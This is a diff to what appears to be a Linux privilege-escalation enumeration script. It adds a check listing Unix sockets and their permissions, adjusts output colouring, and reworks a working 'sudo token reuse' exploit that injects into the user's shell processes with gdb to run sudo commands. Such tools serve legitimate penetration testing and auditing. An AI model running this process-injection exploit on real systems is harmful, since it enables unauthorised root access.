@@ -1496,7 +1496,7 @@ if echo $CHECKS | grep -q ProCronSrvcsTmrsSocks; then
         binW="$binW|$bpath"
       fi
     done
-    ps auxwww 2>/dev/null | awk '{print $11}' | xargs ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$binW,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED}," | sed "s,root,${SED_GREEN},"
+    ps auxwww 2>/dev/null | awk '{print $11}' | xargs ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null | grep -v "$USER " | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$binW,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED}," | sed "s,root,${SED_GREEN},"
   fi
   echo ""
 
@@ -1678,6 +1678,27 @@ if echo $CHECKS | grep -q ProCronSrvcsTmrsSocks; then
   fi
   echo ""
 
+  print_2title "Unix Sockets Listening"
+  print_info "https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets"
+  unix_scks_list=$(netstat -a -p --unix 2>/dev/null | grep -Ei "listen|PID")
+  if ! [ "$unix_scks_list" ];then
+    unix_scks_list=$(ss -l -p -A 'unix' 2>/dev/null | grep -Ei "listen|Proc")
+  fi
+  printf "%s\n" "$unix_scks_list" | while read l; do
+    sckt_path=$(echo $l | grep -Eo "/[a-zA-Z0-9\._/\-]+" | tail -n 1)
+    perms=""
+    if [ -r "$sckt_path" ]; then
+      perms="Read "
+    fi
+    if [ -w "$sckt_path" ];then
+      perms="${perms}Write"
+    fi
+    if ! [ "$perms" ]; then echo "$l" | sed -${E} "s,$sckt_path,${SED_GREEN},g";
+    else echo "$l" | sed -${E} "s,$sckt_path,${SED_RED},g"; echo "  └─(${RED}${perms}${NC})"
+    fi
+  done
+  echo ""
+
   #-- PSC) Search HTTP sockets
   print_2title "HTTP sockets"
   print_info "https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets"
@@ -1724,7 +1745,7 @@ if echo $CHECKS | grep -q ProCronSrvcsTmrsSocks; then
   dbuslist=$(busctl list 2>/dev/null)
   if [ "$dbuslist" ]; then
     busctl list | while read line; do
-      echo "$line" | sed -${E} "s,$dbuslistG,${SED_GREEN},g";
+      echo "$line" | sed -${E} "s,$dbuslistG,${SED_GREEN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},";
       if ! echo "$line" | grep -qE "$dbuslistG"; then
         srvc_object=$(echo $line | cut -d " " -f1)
         srvc_object_info=$(busctl status "$srvc_object" 2>/dev/null | grep -E "^UID|^EUID|^OwnerUID" | tr '\n' ' ')
@@ -2011,10 +2032,13 @@ if echo $CHECKS | grep -q UsrI; then
     for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" 2>/dev/null | grep -v "^$$\$"); do
       echo "Injecting process $pid -> "$(cat "/proc/$pid/comm" 2>/dev/null)
       echo 'call system("echo | sudo -S touch /tmp/shrndom32r2r >/dev/null 2>&1 && echo | sudo -S chmod 777 /tmp/shrndom32r2r >/dev/null 2>&1")' | gdb -q -n -p "$pid" >/dev/null 2>&1
+      if [ -f "/tmp/shrndom32r2r" ]; then
+        echo "Sudo token reuse exploit worked with pid:$pid! (see link)" | sed -${E} "s,.*,${SED_RED_YELLOW},";
+        break
+      fi
     done
     if [ -f "/tmp/shrndom32r2r" ]; then
-      rm /tmp/shrndom32r2r 2>/dev/null
-      echo "Sudo token reuse exploit worked! (see link)" | sed -${E} "s,.*,${SED_RED_YELLOW},";
+      rm -f /tmp/shrndom32r2r 2>/dev/null
     else echo "The escalation didn't work... (try again later?)"
     fi
   fi
